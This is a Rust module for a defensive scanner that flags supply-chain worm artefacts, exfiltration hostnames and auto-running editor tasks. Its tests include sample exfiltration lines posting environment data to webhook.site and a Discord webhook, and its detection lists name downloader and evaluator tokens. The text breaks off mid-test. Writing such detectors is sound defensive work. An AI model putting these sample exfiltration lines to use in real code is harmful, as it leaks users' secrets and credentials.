//! Known-IOC scanner for the workspace surface.
//!
//! Distinct from [`crate::tamper`] generic drift detection: this module
//! elevates a small, curated set of *specific* file paths from "something
//! changed" to "this is the fingerprint of a known supply-chain worm".
//! False positives are tolerable; false negatives are the failure mode
//! we care about, because by the time these files exist the attacker
//! has already written to disk.
//!
//! Two kinds of indicators ship today:
//! - **Path-based** ([`RuleKind::PathSuffix`] / [`RuleKind::Basename`]):
//!   match purely on a file's location. Cheap; the original v1 slice.
//! - **Content-based** ([`RuleKind::ContentNeedle`]): match when a
//!   file's *content* contains a known exfil endpoint string. The
//!   needles are picked to never legitimately appear in workspace
//!   files (`webhook.site`, `discord.com/api/webhooks/`, …) so the
//!   false-positive rate stays close to zero. Reads are capped at
//!   [`MAX_CONTENT_BYTES`] and only happen via [`scan_paths_in_root`]
//!   (callers without filesystem access stay on the path-only
//!   [`scan_paths`] entry point — no behaviour change for them).
//!
//! The catalog is statically compiled into the binary today. The
//! roadmap calls for a `sakimori iocs update` that refreshes from a
//! signed YAML; the catalog API (`Catalog::default()` + an explicit
//! `version`) is shaped so a future loader can swap in a runtime
//! catalog without changing callers.

use std::path::{Component, Path, PathBuf};

use serde::Serialize;

/// Version of the bundled catalog. Bump whenever the rule set changes
/// so JSON consumers can tell which fingerprints were active.
pub const CATALOG_VERSION: &str = "2026.05.27";

/// How many bytes of any single file the content scanner will read.
/// 64 KiB easily covers `.npmrc`, `pyproject.toml`, lockfile metadata,
/// individual workflow YAMLs, and `package.json` for all but the
/// gnarliest monorepo roots. Files that exceed this are still
/// considered — we just check the head; an exfil URL hidden past 64
/// KiB is a contrived evasion we accept the false negative on rather
/// than read every byte of every binary blob in the tree.
pub const MAX_CONTENT_BYTES: usize = 64 * 1024;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    /// High-confidence fingerprint of a known campaign. Treat as a
    /// strong signal that the workspace is compromised — investigate
    /// before continuing the run.
    High,
    /// Suggestive but not conclusive on its own. The file is rarely
    /// legitimate in a CI checkout but isn't a campaign-specific name.
    Medium,
}

/// A single path-based indicator. `pattern` is interpreted by `kind`.
#[derive(Debug, Clone, Copy)]
pub struct Rule {
    /// Stable identifier — appears in JSON output. `family.short_name`.
    pub id: &'static str,
    /// Campaign / family the indicator belongs to. Used to group
    /// findings in human-readable output.
    pub family: &'static str,
    pub severity: Severity,
    pub kind: RuleKind,
    pub pattern: &'static str,
    /// One-line human description. Shown in text output next to the
    /// path so reviewers don't have to remember what `setup.mjs` is.
    pub description: &'static str,
}

#[derive(Debug, Clone, Copy)]
pub enum RuleKind {
    /// Match when the relative path ends with `pattern`, split on
    /// path components. `pattern = ".claude/setup.mjs"` matches
    /// `.claude/setup.mjs` and `subdir/.claude/setup.mjs` but not
    /// `claude/setup.mjs`.
    PathSuffix,
    /// Match when the basename equals `pattern` (case-sensitive).
    Basename,
    /// Match when the file's content contains the literal bytes
    /// `needle` (case-insensitive ASCII). If `basename_filter` is
    /// `Some`, only files with that exact basename are read — keeps
    /// the content scanner from opening every `.txt` in the tree to
    /// look for a needle that almost certainly isn't there. The
    /// `pattern` field is unused for this kind (kept on [`Rule`] for
    /// the common shape) and conventionally set to the needle for
    /// readability of catalog tables.
    ContentNeedle {
        needle: &'static str,
        basename_filter: Option<&'static str>,
    },
    /// Structural rule against a VS Code / Cursor `settings.json`:
    /// parse the file as JSONC (strip `//` / `/* */` comments and
    /// trailing commas before deserialising), walk
    /// `terminal.integrated.profiles.<os>.<name>.args`, and flag a
    /// profile whose `args` carries both a shell-exec flag
    /// (`-c` / `/c` / `-Command` / `-EncodedCommand`) and a known
    /// downloader / dynamic-evaluator token (`curl`, `wget`, `iwr`,
    /// `Invoke-WebRequest`, `Invoke-Expression`, `IEX`, `eval`,
    /// `base64 -d` / `base64 --decode`). The combination is the
    /// VSCode-extension parallel of `tasks.json:"runOn":"folderOpen"`
    /// — a workspace-bound terminal profile that auto-executes a
    /// downloaded payload the moment a developer opens the terminal.
    /// Substring-only content matching is too coarse here
    /// (legitimate `bash --login` profiles would dominate); the
    /// structural pass is what keeps false-positive rate honest.
    ///
    /// `path_suffixes` scopes which files are eligible — workspace
    /// `.vscode/settings.json` and `.cursor/settings.json` only.
    /// User settings (`~/.vscode/User/settings.json`, etc.) are
    /// deliberately out of scope: out-of-tree, attribution hazier,
    /// and outside the snapshot/diff surfaces this catalog feeds.
    SettingsTerminalAutorun {
        path_suffixes: &'static [&'static str],
    },
}

/// The bundled catalog. Ordered so higher-confidence indicators appear
/// first; downstream renderers may rely on stability when comparing
/// runs but should not depend on it for correctness.
pub fn catalog() -> &'static [Rule] {
    &[
        Rule {
            id: "shai-hulud.claude-setup-mjs",
            family: "shai-hulud",
            severity: Severity::High,
            kind: RuleKind::PathSuffix,
            pattern: ".claude/setup.mjs",
            description: "Shai-Hulud dropper — writes a `.claude/setup.mjs` \
                          hook that re-executes on next Claude Code session.",
        },
        Rule {
            id: "shai-hulud.data-json",
            family: "shai-hulud",
            severity: Severity::High,
            kind: RuleKind::Basename,
            pattern: "shai-hulud-data.json",
            description: "Shai-Hulud staging artefact — exfiltrated \
                          credentials are spooled to this file before \
                          being POSTed to the C2.",
        },
        Rule {
            id: "shai-hulud.workflow-yaml",
            family: "shai-hulud",
            severity: Severity::High,
            kind: RuleKind::PathSuffix,
            pattern: ".github/workflows/shai-hulud-workflow.yml",
            description: "Shai-Hulud persistence — adds a workflow that \
                          re-runs the dropper on every push.",
        },
        Rule {
            id: "supplychain.suspicious-codeql",
            family: "supplychain-generic",
            severity: Severity::Medium,
            kind: RuleKind::PathSuffix,
            pattern: ".github/workflows/codeql_analysis.yml",
            description: "Workflow file with the CodeQL-analysis name \
                          observed as a cover for malicious workflow \
                          additions. False-positive when the repo \
                          legitimately uses CodeQL — verify the \
                          contents before reacting.",
        },
        Rule {
            id: "supplychain.npmrc-token",
            family: "supplychain-generic",
            severity: Severity::Medium,
            kind: RuleKind::Basename,
            pattern: ".npmrc",
            description: "An `.npmrc` appearing in a workspace where \
                          none existed before commonly indicates a \
                          token-exfiltration or registry-redirection \
                          attempt. Inspect for `//*:_authToken=` or a \
                          non-default `registry=` line.",
        },
        Rule {
            id: "exfil.webhook-site",
            family: "supplychain-generic",
            severity: Severity::High,
            kind: RuleKind::ContentNeedle {
                needle: "webhook.site",
                basename_filter: None,
            },
            pattern: "webhook.site",
            description: "Reference to `webhook.site` — a free request-\
                          capture service routinely used as a one-off C2 \
                          / exfiltration endpoint by supply-chain droppers. \
                          Legitimate workspace files almost never embed it.",
        },
        Rule {
            id: "exfil.discord-webhook",
            family: "supplychain-generic",
            severity: Severity::High,
            kind: RuleKind::ContentNeedle {
                needle: "discord.com/api/webhooks/",
                basename_filter: None,
            },
            pattern: "discord.com/api/webhooks/",
            description: "Discord webhook URL — the canonical low-effort \
                          exfil channel in recent npm / PyPI worm samples \
                          (POST a JSON payload to the webhook and the \
                          attacker reads the message). Inspect for an \
                          embedded token after the path.",
        },
        Rule {
            id: "exfil.requestbin",
            family: "supplychain-generic",
            severity: Severity::High,
            kind: RuleKind::ContentNeedle {
                needle: "requestbin.com",
                basename_filter: None,
            },
            pattern: "requestbin.com",
            description: "Reference to `requestbin.com` — another request-\
                          capture service in the same threat family as \
                          `webhook.site`. Legitimate use in a checkout is \
                          vanishingly rare.",
        },
        Rule {
            id: "exfil.discord-legacy-webhook",
            family: "supplychain-generic",
            severity: Severity::High,
            kind: RuleKind::ContentNeedle {
                needle: "discordapp.com/api/webhooks/",
                basename_filter: None,
            },
            pattern: "discordapp.com/api/webhooks/",
            description: "Legacy Discord webhook URL (`discordapp.com`) — \
                          still routable, same threat shape as the canonical \
                          `discord.com/api/webhooks/`. Catches droppers that \
                          embed the older hostname to dodge a literal \
                          `discord.com` grep.",
        },
        Rule {
            id: "exfil.interactsh",
            family: "supplychain-generic",
            severity: Severity::High,
            kind: RuleKind::ContentNeedle {
                needle: "interact.sh",
                basename_filter: None,
            },
            pattern: "interact.sh",
            description: "Reference to Project Discovery's `interact.sh` \
                          OAST tool — the default exfil hostname in many \
                          published payloads. Legitimate workspace files \
                          essentially never embed it.",
        },
        Rule {
            id: "exfil.oastify",
            family: "supplychain-generic",
            severity: Severity::High,
            kind: RuleKind::ContentNeedle {
                needle: "oastify.com",
                basename_filter: None,
            },
            pattern: "oastify.com",
            description: "Reference to `oastify.com` — Burp Collaborator's \
                          public hostname pool, used as an out-of-band \
                          exfil / canary endpoint. Strong indicator the \
                          file came out of a pentest payload generator.",
        },
        Rule {
            id: "exfil.transfer-sh",
            family: "supplychain-generic",
            severity: Severity::High,
            kind: RuleKind::ContentNeedle {
                needle: "transfer.sh",
                basename_filter: None,
            },
            pattern: "transfer.sh",
            description: "Reference to `transfer.sh` — a throwaway file-\
                          upload service routinely used to stage exfiltrated \
                          tarballs (creds, ssh keys, env dumps) before the \
                          attacker pulls them down out of band.",
        },
        Rule {
            id: "exfil.requestrepo",
            family: "supplychain-generic",
            severity: Severity::High,
            kind: RuleKind::ContentNeedle {
                needle: "requestrepo.com",
                basename_filter: None,
            },
            pattern: "requestrepo.com",
            description: "Reference to `requestrepo.com` — modern \
                          OAST/webhook capture service that has replaced \
                          `requestbin` in several recent supply-chain \
                          worm samples.",
        },
        Rule {
            id: "vscode.tasks-folderopen-autorun",
            family: "editor-extension",
            severity: Severity::High,
            kind: RuleKind::ContentNeedle {
                // `runOn: "folderOpen"` is the VSCode primitive that
                // executes a task the moment a workspace is opened —
                // no command-palette interaction required. The string
                // appears almost exclusively in this exact context;
                // false positives in normal repos are vanishingly
                // rare. Constrained to `tasks.json` (`launch.json`
                // and `settings.json` don't accept the same key) to
                // keep the surface tight.
                needle: "\"runOn\": \"folderOpen\"",
                basename_filter: Some("tasks.json"),
            },
            pattern: "\"runOn\": \"folderOpen\"",
            description: "VSCode `.vscode/tasks.json` configured to \
                          auto-run a task on `folderOpen`. Editor \
                          opens the workspace → task runs with the \
                          user's privileges, no prompt. The canonical \
                          dropper primitive for workspace-poisoning \
                          attacks; a clean repo essentially never \
                          ships this.",
        },
        Rule {
            id: "editor-extension.terminal-profile-autorun-downloader",
            family: "editor-extension",
            severity: Severity::Medium,
            kind: RuleKind::SettingsTerminalAutorun {
                path_suffixes: &[".vscode/settings.json", ".cursor/settings.json"],
            },
            pattern: "terminal.integrated.profiles[...].args",
            description: "Workspace `.vscode/settings.json` (or \
                          `.cursor/settings.json`) declares a terminal \
                          profile whose `args` carries both a shell-\
                          exec flag (`-c`, `/c`, `-Command`, \
                          `-EncodedCommand`) and a downloader / \
                          dynamic-evaluator token (`curl`, `wget`, \
                          `iwr`, `Invoke-WebRequest`, \
                          `Invoke-Expression`, `eval`, `base64 -d`). \
                          A devcontainer might legitimately bootstrap \
                          this way, but a clean repo essentially never \
                          ships it — review the matched profile before \
                          dismissing.",
        },
        Rule {
            id: "exfil.pipedream-webhook",
            family: "supplychain-generic",
            severity: Severity::High,
            kind: RuleKind::ContentNeedle {
                // Match the per-tenant webhook subdomain shape
                // (`<id>.m.pipedream.net`) rather than the bare
                // `pipedream.net` apex — the apex shows up in
                // legitimate tutorial / config snippets, the
                // `.m.pipedream.net` shape is webhook-only.
                needle: "m.pipedream.net",
                basename_filter: None,
            },
            pattern: "m.pipedream.net",
            description: "Reference to a Pipedream webhook endpoint \
                          (`*.m.pipedream.net`). The webhook subdomain is \
                          extremely unusual outside automation pipelines; \
                          a workspace file that embeds one is most likely \
                          a dropper using Pipedream as a one-off exfil \
                          sink.",
        },
    ]
}

/// Decide whether `path` matches any **path-based** catalog rule.
/// `path` should be **relative** to the workspace root — callers using
/// [`crate::tamper::Snapshot::files`] already get relative paths
/// because the snapshot keys on them.
///
/// Content-based rules ([`RuleKind::ContentNeedle`]) are deliberately
/// not evaluated here — they need filesystem access. Use
/// [`scan_paths_in_root`] for the combined check.
pub fn matches(path: &Path) -> Vec<&'static Rule> {
    let normalised = normalise(path);
    let basename = normalised
        .components()
        .next_back()
        .and_then(|c| match c {
            Component::Normal(s) => s.to_str(),
            _ => None,
        })
        .unwrap_or("");

    let mut out = Vec::new();
    for rule in catalog() {
        let hit = match rule.kind {
            RuleKind::Basename => basename == rule.pattern,
            RuleKind::PathSuffix => path_ends_with(&normalised, rule.pattern),
            RuleKind::ContentNeedle { .. } => false,
            // Structural rules need bytes — `matches()` is path-only.
            RuleKind::SettingsTerminalAutorun { .. } => false,
        };
        if hit {
            out.push(rule);
        }
    }
    out
}

/// True iff `path` is in-scope for any rule that has structural-
/// content semantics (i.e. needs the file's bytes parsed beyond a
/// substring match). Today this covers
/// [`RuleKind::SettingsTerminalAutorun`]; the result is used by
/// [`scan_paths_in_root`] to decide whether to read the file at
/// all.
fn path_in_scope_for_structural(path: &Path) -> bool {
    let normalised = normalise(path);
    for rule in catalog() {
        if let RuleKind::SettingsTerminalAutorun { path_suffixes } = rule.kind {
            for suf in path_suffixes {
                if path_ends_with(&normalised, suf) {
                    return true;
                }
            }
        }
    }
    false
}

/// Run every [`RuleKind::SettingsTerminalAutorun`] rule whose
/// `path_suffixes` covers `path` against `bytes`. Returns the
/// rules that fire — structural decision lives in
/// [`detect_terminal_autorun_downloader`]; this function is only
/// the wiring.
pub fn matches_structural(path: &Path, bytes: &[u8]) -> Vec<&'static Rule> {
    let normalised = normalise(path);
    let mut out = Vec::new();
    for rule in catalog() {
        let RuleKind::SettingsTerminalAutorun { path_suffixes } = rule.kind else {
            continue;
        };
        if !path_suffixes
            .iter()
            .any(|suf| path_ends_with(&normalised, suf))
        {
            continue;
        }
        if detect_terminal_autorun_downloader(bytes) {
            out.push(rule);
        }
    }
    out
}

/// Strip the two JSONC affordances VS Code accepts in `settings.json`:
/// `//` line comments (until the next newline) and `/* … */` block
/// comments, plus trailing commas before `}` / `]`. Strings (anything
/// between unescaped double quotes) are passed through verbatim so a
/// URL containing `//` doesn't get truncated.
///
/// Intentionally lenient: this isn't a spec-complete JSONC parser, it
/// just produces something `serde_json` accepts for the
/// terminal-profile walk. Callers must already be prepared for parse
/// failures (fail-open).
fn jsonc_to_json(bytes: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    let n = bytes.len();
    let mut in_str = false;
    let mut str_escaped = false;
    while i < n {
        let b = bytes[i];
        if in_str {
            out.push(b);
            if str_escaped {
                str_escaped = false;
            } else if b == b'\\' {
                str_escaped = true;
            } else if b == b'"' {
                in_str = false;
            }
            i += 1;
            continue;
        }
        if b == b'"' {
            in_str = true;
            out.push(b);
            i += 1;
            continue;
        }
        if b == b'/' && i + 1 < n {
            match bytes[i + 1] {
                b'/' => {
                    i += 2;
                    while i < n && bytes[i] != b'\n' {
                        i += 1;
                    }
                    continue;
                }
                b'*' => {
                    i += 2;
                    while i + 1 < n && !(bytes[i] == b'*' && bytes[i + 1] == b'/') {
                        i += 1;
                    }
                    i = (i + 2).min(n);
                    continue;
                }
                _ => {}
            }
        }
        out.push(b);
        i += 1;
    }
    // Trailing-comma strip: `,` followed by whitespace then `}` or `]`.
    let mut stripped = Vec::with_capacity(out.len());
    let mut j = 0;
    let m = out.len();
    while j < m {
        if out[j] == b',' {
            let mut k = j + 1;
            while k < m && (out[k] == b' ' || out[k] == b'\t' || out[k] == b'\n' || out[k] == b'\r')
            {
                k += 1;
            }
            if k < m && (out[k] == b'}' || out[k] == b']') {
                // Skip the comma — leave the whitespace + closing
                // bracket in place.
                j += 1;
                continue;
            }
        }
        stripped.push(out[j]);
        j += 1;
    }
    stripped
}

/// Inspect a `settings.json`-shaped JSONC body and return `true` iff
/// any `terminal.integrated.profiles.<os>.<profile>.args` array
/// contains *both* a shell-exec flag and a downloader / dynamic-
/// evaluator token in the *same* profile.
///
/// Both halves are required deliberately: many legitimate profiles
/// pass `-c` to a shell as a startup hook, and many legitimate
/// scripts mention `curl` in argument vectors that aren't shell-
/// exec'd. Demanding the co-occurrence is what keeps the rule from
/// drowning in false positives.
fn detect_terminal_autorun_downloader(bytes: &[u8]) -> bool {
    let normalised = jsonc_to_json(bytes);
    let v: serde_json::Value = match serde_json::from_slice(&normalised) {
        Ok(v) => v,
        Err(_) => return false,
    };
    let Some(root) = v.as_object() else {
        return false;
    };
    // VS Code settings.json uses *flat* dotted keys at the top level:
    // `"terminal.integrated.profiles.linux"` is one literal key, not a
    // nested object path. Iterate every key with that prefix and
    // inspect its profile map.
    for (key, by_os) in root {
        if !key.starts_with("terminal.integrated.profiles.") {
            continue;
        }
        let Some(by_os) = by_os.as_object() else {
            continue;
        };
        for (_name, profile) in by_os {
            let Some(args) = profile.get("args").and_then(|x| x.as_array()) else {
                continue;
            };
            let mut has_exec_flag = false;
            let mut has_downloader = false;
            for arg in args {
                let Some(s) = arg.as_str() else {
                    continue;
                };
                if is_shell_exec_flag(s) {
                    has_exec_flag = true;
                }
                if contains_downloader_token(s) {
                    has_downloader = true;
                }
            }
            if has_exec_flag && has_downloader {
                return true;
            }
        }
    }
    false
}

fn is_shell_exec_flag(s: &str) -> bool {
    let t = s.trim();
    // POSIX shells: `-c`. Windows cmd: `/c` / `/C` / `/k` / `/K`.
    // PowerShell: `-Command` / `-c` / `-EncodedCommand` / `-e`.
    matches!(
        t,
        "-c" | "/c" | "/C" | "/k" | "/K" | "-Command" | "-EncodedCommand" | "-e"
    )
}

fn contains_downloader_token(s: &str) -> bool {
    let lower = s.to_ascii_lowercase();
    const TOKENS: &[&str] = &[
        "curl",
        "wget",
        "iwr",
        "invoke-webrequest",
        "invoke-expression",
        "iex",
        "eval ",
        "eval(",
        "base64 -d",
        "base64 --decode",
    ];
    TOKENS.iter().any(|t| lower.contains(t))
}

/// Decide whether `bytes` (capped to [`MAX_CONTENT_BYTES`] by the
/// caller) trips any content rule whose `basename_filter` matches the
/// passed `basename` (or whose filter is `None`).
///
/// Case-insensitive ASCII match — exfil URLs in droppers are
/// occasionally upper-cased to dodge naïve grep filters, and the
/// canonical hostnames are all 7-bit anyway.
pub fn matches_content(basename: &str, bytes: &[u8]) -> Vec<&'static Rule> {
    let lower = bytes.to_ascii_lowercase();
    let mut out = Vec::new();
    for rule in catalog() {
        let RuleKind::ContentNeedle {
            needle,
            basename_filter,
        } = rule.kind
        else {
            // Structural rules are handled by `matches_structural`,
            // not here — they need the relative path, not just the
            // basename, to apply their scope.
            continue;
        };
        if let Some(want) = basename_filter
            && want != basename
        {
            continue;
        }
        if find_lower(&lower, needle.as_bytes()) {
            out.push(rule);
        }
    }
    out
}

/// Combined path-only + content scan rooted at `root`. For each path
/// (interpreted as relative to `root`), evaluates path-based rules
/// first, then — if any content rule passes its basename filter for
/// this file — reads up to [`MAX_CONTENT_BYTES`] of the file once and
/// runs the content rules against it. Read failures (file gone,
/// permission denied) are silently treated as empty content; the
/// scanner's job is to surface positives, not to invent rejections.
pub fn scan_paths_in_root<'a, I, P>(root: &Path, paths: I) -> Vec<Finding>
where
    I: IntoIterator<Item = &'a P>,
    P: AsRef<Path> + 'a + ?Sized,
{
    let mut out = Vec::new();
    for p in paths {
        let rel = p.as_ref();
        for rule in matches(rel) {
            out.push(Finding {
                path: rel.to_path_buf(),
                rule_id: rule.id,
                family: rule.family,
                severity: rule.severity,
                description: rule.description,
            });
        }
        let basename = rel.file_name().and_then(|n| n.to_str()).unwrap_or_default();
        let any_content_rule_wants_this_file = catalog().iter().any(|r| match r.kind {
            RuleKind::ContentNeedle {
                basename_filter, ..
            } => basename_filter.is_none_or(|want| want == basename),
            _ => false,
        });
        let structural_in_scope = path_in_scope_for_structural(rel);
        if !any_content_rule_wants_this_file && !structural_in_scope {
            continue;
        }
        let abs = root.join(rel);
        let bytes = read_capped(&abs, MAX_CONTENT_BYTES);
        if any_content_rule_wants_this_file {
            for rule in matches_content(basename, &bytes) {
                out.push(Finding {
                    path: rel.to_path_buf(),
                    rule_id: rule.id,
                    family: rule.family,
                    severity: rule.severity,
                    description: rule.description,
                });
            }
        }
        if structural_in_scope {
            for rule in matches_structural(rel, &bytes) {
                out.push(Finding {
                    path: rel.to_path_buf(),
                    rule_id: rule.id,
                    family: rule.family,
                    severity: rule.severity,
                    description: rule.description,
                });
            }
        }
    }
    out
}

fn read_capped(path: &Path, cap: usize) -> Vec<u8> {
    use std::io::Read;
    let Ok(mut f) = std::fs::File::open(path) else {
        return Vec::new();
    };
    let mut buf = Vec::with_capacity(cap.min(8 * 1024));
    if (&mut f).take(cap as u64).read_to_end(&mut buf).is_err() {
        return Vec::new();
    }
    buf
}

/// Case-insensitive substring search. Input is already lowercased.
/// `needle` may contain ASCII uppercase, which we lower on the fly to
/// avoid allocating a second buffer for the needle each call.
fn find_lower(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || needle.len() > haystack.len() {
        return needle.is_empty();
    }
    'outer: for window_start in 0..=haystack.len() - needle.len() {
        for (i, &n) in needle.iter().enumerate() {
            if haystack[window_start + i] != n.to_ascii_lowercase() {
                continue 'outer;
            }
        }
        return true;
    }
    false
}

/// Scan an iterator of paths against the catalog. Findings are
/// returned in the order they're matched (which is `paths` × catalog
/// order, so deterministic given a sorted input).
pub fn scan_paths<'a, I, P>(paths: I) -> Vec<Finding>
where
    I: IntoIterator<Item = &'a P>,
    P: AsRef<Path> + 'a + ?Sized,
{
    let mut out = Vec::new();
    for p in paths {
        let p = p.as_ref();
        for rule in matches(p) {
            out.push(Finding {
                path: p.to_path_buf(),
                rule_id: rule.id,
                family: rule.family,
                severity: rule.severity,
                description: rule.description,
            });
        }
    }
    out
}

#[derive(Debug, Clone, Serialize)]
pub struct Finding {
    pub path: PathBuf,
    pub rule_id: &'static str,
    pub family: &'static str,
    pub severity: Severity,
    pub description: &'static str,
}

#[derive(Debug, Clone, Default, Serialize)]
pub struct Report {
    pub catalog_version: &'static str,
    pub findings: Vec<Finding>,
}

impl Report {
    pub fn new(findings: Vec<Finding>) -> Self {
        Self {
            catalog_version: CATALOG_VERSION,
            findings,
        }
    }

    pub fn is_clean(&self) -> bool {
        self.findings.is_empty()
    }

    /// True when at least one finding is High-severity. Block-mode
    /// callers should treat this as a non-zero exit signal.
    pub fn has_high(&self) -> bool {
        self.findings.iter().any(|f| f.severity == Severity::High)
    }
}

/// Normalise the input path: strip a leading `./`, collapse any
/// duplicate separators, drop trailing `/`. We do not resolve `..`
/// because we want to refuse to match across a parent-dir hop — an
/// attacker who somehow gets `foo/../.claude/setup.mjs` into the diff
/// is still a hit if we leave `..` in place (it's nonsense as a
/// filesystem path) and a miss if we resolve it (changes the
/// semantics). Leaving as-is keeps the suffix match honest.
fn normalise(path: &Path) -> PathBuf {
    let mut buf = PathBuf::new();
    for comp in path.components() {
        match comp {
            Component::CurDir => {}
            other => buf.push(other.as_os_str()),
        }
    }
    buf
}

/// Suffix match on path **components** (not bytes). `path_ends_with(
/// "a/b/c.txt", "b/c.txt")` is `true`; `path_ends_with("ab/c.txt",
/// "b/c.txt")` is `false`.
fn path_ends_with(path: &Path, suffix: &str) -> bool {
    let suffix_path = Path::new(suffix);
    let pcs: Vec<_> = path.components().collect();
    let scs: Vec<_> = suffix_path.components().collect();
    if scs.len() > pcs.len() {
        return false;
    }
    let tail = &pcs[pcs.len() - scs.len()..];
    tail.iter()
        .zip(scs.iter())
        .all(|(a, b)| a.as_os_str() == b.as_os_str())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shai_hulud_setup_mjs_matches_at_root_and_nested() {
        assert_eq!(matches(Path::new(".claude/setup.mjs")).len(), 1);
        assert_eq!(matches(Path::new("foo/.claude/setup.mjs")).len(), 1);
        assert_eq!(matches(Path::new("./.claude/setup.mjs")).len(), 1);
    }

    #[test]
    fn near_misses_do_not_match() {
        // Sibling directory name — must not match.
        assert!(matches(Path::new("claude/setup.mjs")).is_empty());
        // Same basename in an unrelated dir.
        assert!(matches(Path::new(".claude-bak/setup.mjs")).is_empty());
        // Different basename inside the right dir.
        assert!(matches(Path::new(".claude/init.mjs")).is_empty());
    }

    #[test]
    fn basename_rule_matches_anywhere() {
        let hits = matches(Path::new("deep/nested/.npmrc"));
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].id, "supplychain.npmrc-token");
    }

    #[test]
    fn shai_hulud_data_json_basename_match() {
        assert_eq!(matches(Path::new("anywhere/shai-hulud-data.json")).len(), 1);
        // The basename rule is exact — a similar but distinct name
        // must not collide.
        assert!(matches(Path::new("anywhere/shai-hulud-data.json.bak")).is_empty());
    }

    #[test]
    fn scan_paths_collects_findings() {
        let paths = [
            PathBuf::from(".claude/setup.mjs"),
            PathBuf::from("src/main.rs"), // benign
            PathBuf::from(".github/workflows/shai-hulud-workflow.yml"),
        ];
        let findings = scan_paths(paths.iter());
        assert_eq!(findings.len(), 2);
        assert!(findings.iter().all(|f| f.severity == Severity::High));
    }

    #[test]
    fn report_severity_flags() {
        let medium_only = Report::new(vec![Finding {
            path: PathBuf::from("a/.npmrc"),
            rule_id: "supplychain.npmrc-token",
            family: "supplychain-generic",
            severity: Severity::Medium,
            description: "",
        }]);
        assert!(!medium_only.is_clean());
        assert!(!medium_only.has_high());

        let high = Report::new(vec![Finding {
            path: PathBuf::from(".claude/setup.mjs"),
            rule_id: "shai-hulud.claude-setup-mjs",
            family: "shai-hulud",
            severity: Severity::High,
            description: "",
        }]);
        assert!(high.has_high());
    }

    // --- content-rule tests -----------------------------------------------

    #[test]
    fn matches_skips_content_rules() {
        // `matches()` is path-only — it must not return content rules,
        // even when the path looks like one that might carry a needle.
        let hits = matches(Path::new(".npmrc"));
        for r in &hits {
            assert!(
                !matches!(r.kind, RuleKind::ContentNeedle { .. }),
                "matches() leaked a content rule: {r:?}"
            );
        }
    }

    #[test]
    fn content_rule_fires_on_webhook_site_url() {
        let bytes = b"const url = 'https://webhook.site/abcd-1234';";
        let hits = matches_content("steal.js", bytes);
        assert!(hits.iter().any(|r| r.id == "exfil.webhook-site"));
    }

    #[test]
    fn content_rule_is_case_insensitive() {
        let bytes = b"FETCH https://Webhook.Site/UPPER";
        let hits = matches_content("any.txt", bytes);
        assert!(hits.iter().any(|r| r.id == "exfil.webhook-site"));
    }

    #[test]
    fn discord_webhook_url_trips_rule() {
        let bytes = b"axios.post('https://discord.com/api/webhooks/123/abc', payload)";
        let hits = matches_content("postinstall.js", bytes);
        assert!(hits.iter().any(|r| r.id == "exfil.discord-webhook"));
    }

    #[test]
    fn content_rules_quiet_on_benign_bytes() {
        let hits = matches_content("README.md", b"This project uses webhooks internally.");
        // No needle present → no hit.
        assert!(hits.is_empty());
    }

    #[test]
    fn scan_paths_in_root_reads_content_and_finds_needle() {
        // Build a tmpdir with one needle-bearing file and one benign
        // file. Verify the scanner only reports the malicious one.
        let tmp = std::env::temp_dir().join(format!(
            "sakimori-iocs-content-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(tmp.join("a")).unwrap();
        std::fs::write(
            tmp.join("a/steal.js"),
            "fetch('https://webhook.site/xxx', { body: process.env.HOME })",
        )
        .unwrap();
        std::fs::write(tmp.join("a/clean.js"), "console.log('hello')").unwrap();
        let paths = [PathBuf::from("a/steal.js"), PathBuf::from("a/clean.js")];
        let findings = scan_paths_in_root(&tmp, paths.iter());
        assert_eq!(findings.len(), 1, "got: {findings:#?}");
        assert_eq!(findings[0].rule_id, "exfil.webhook-site");
        assert_eq!(findings[0].path, PathBuf::from("a/steal.js"));
        std::fs::remove_dir_all(&tmp).ok();
    }

    #[test]
    fn scan_paths_in_root_combines_path_and_content_findings() {
        // `.npmrc` is a path-rule hit (Medium); a needle inside is a
        // separate content-rule hit (High). Both must appear so the
        // reviewer sees the path-only Medium even on a clean file
        // *and* the upgraded High on a dirty one.
        let tmp = std::env::temp_dir().join(format!(
            "sakimori-iocs-combined-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&tmp).unwrap();
        std::fs::write(
            tmp.join(".npmrc"),
            "//registry.npmjs.org/:_authToken=fake\n# https://webhook.site/exfil\n",
        )
        .unwrap();
        let paths = [PathBuf::from(".npmrc")];
        let findings = scan_paths_in_root(&tmp, paths.iter());
        let ids: Vec<&str> = findings.iter().map(|f| f.rule_id).collect();
        assert!(
            ids.contains(&"supplychain.npmrc-token"),
            "missing path-rule hit: {ids:?}"
        );
        assert!(
            ids.contains(&"exfil.webhook-site"),
            "missing content-rule hit: {ids:?}"
        );
        std::fs::remove_dir_all(&tmp).ok();
    }

    #[test]
    fn scan_paths_in_root_fails_open_on_missing_file() {
        // Path is referenced but the file doesn't actually exist on
        // disk (e.g. dropped after the diff snapshot). Content rules
        // see empty bytes; no panic, no fabricated finding.
        let tmp = std::env::temp_dir().join(format!(
            "sakimori-iocs-missing-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&tmp).unwrap();
        let paths = [PathBuf::from("ghost.js")];
        let findings = scan_paths_in_root(&tmp, paths.iter());
        assert!(findings.is_empty(), "got: {findings:#?}");
        std::fs::remove_dir_all(&tmp).ok();
    }

    #[test]
    fn content_read_is_capped() {
        // A multi-MB file with the needle past the cap should NOT hit
        // — documents the accepted false-negative for binary blobs.
        let tmp = std::env::temp_dir().join(format!(
            "sakimori-iocs-cap-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&tmp).unwrap();
        let mut content = vec![b'.'; MAX_CONTENT_BYTES + 4096];
        let needle = b"webhook.site/late";
        content.extend_from_slice(needle);
